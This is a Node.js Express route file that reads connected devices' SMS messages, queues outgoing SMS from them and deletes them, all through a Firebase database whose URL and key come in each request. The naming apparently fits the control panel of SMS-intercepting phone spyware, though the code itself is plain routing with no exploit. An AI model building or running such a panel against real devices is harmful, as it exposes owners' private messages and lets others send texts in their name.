"use strict";

/**
 * Device management routes.
 * Higher-level device operations built on top of the Firebase service.
 */

const { Router } = require("express");
const FirebaseService = require("../services/firebase");
const DeviceService = require("../services/devices");
const { requireFields } = require("../middleware/validate");

const router = Router();

/**
 * POST /api/devices/list
 * Fetch and normalize all connected devices.
 *
 * Body: { url, key }
 */
router.post("/list", requireFields("url", "key"), async (req, res, next) => {
  try {
    const { url, key } = req.body;
    const clientsData = await FirebaseService.read(url, key, "clients");
    const devices = DeviceService.parseAll(clientsData);
    res.json({
      success: true,
      count: devices.length,
      online: devices.filter((d) => d.status).length,
      devices,
    });
  } catch (err) {
    next(err);
  }
});

/**
 * POST /api/devices/:id
 * Fetch a single device's details.
 *
 * Body: { url, key }
 */
router.post("/:id", requireFields("url", "key"), async (req, res, next) => {
  try {
    const { url, key } = req.body;
    const { id } = req.params;
    const raw = await FirebaseService.read(url, key, `clients/${id}`);
    if (!raw) {
      return res.status(404).json({ error: "Device not found" });
    }
    const device = DeviceService.normalize(id, raw);
    res.json({ success: true, device });
  } catch (err) {
    next(err);
  }
});

/**
 * POST /api/devices/:id/messages
 * Fetch SMS messages for a device.
 *
 * Body: { url, key }
 */
router.post("/:id/messages", requireFields("url", "key"), async (req, res, next) => {
  try {
    const { url, key } = req.body;
    const { id } = req.params;
    const messagesData = await FirebaseService.read(url, key, `messages/${id}`);
    const messages = DeviceService.parseMessages(messagesData);
    res.json({
      success: true,
      count: messages.length,
      messages,
    });
  } catch (err) {
    next(err);
  }
});

/**
 * POST /api/devices/:id/send-sms
 * Queue an SMS to be sent from a device.
 *
 * Body: { url, key, to, message, from? }
 */
router.post("/:id/send-sms", requireFields("url", "key", "to", "message"), async (req, res, next) => {
  try {
    const { url, key, to, message, from } = req.body;
    const { id } = req.params;

    await FirebaseService.write(url, key, `clients/${id}/webhookEvent/sendSms`, {
      from: from || 1,
      to,
      message,
      isSended: false,
    });

    res.json({ success: true, message: "SMS queued successfully" });
  } catch (err) {
    next(err);
  }
});

/**
 * POST /api/devices/:id/delete
 * Delete a device from Firebase.
 *
 * Body: { url, key }
 */
router.post("/:id/delete", requireFields("url", "key"), async (req, res, next) => {
  try {
    const { url, key } = req.body;
    const { id } = req.params;
    await FirebaseService.remove(url, key, `clients/${id}`);
    res.json({ success: true, message: "Device deleted" });
  } catch (err) {
    next(err);
  }
});

module.exports = router;
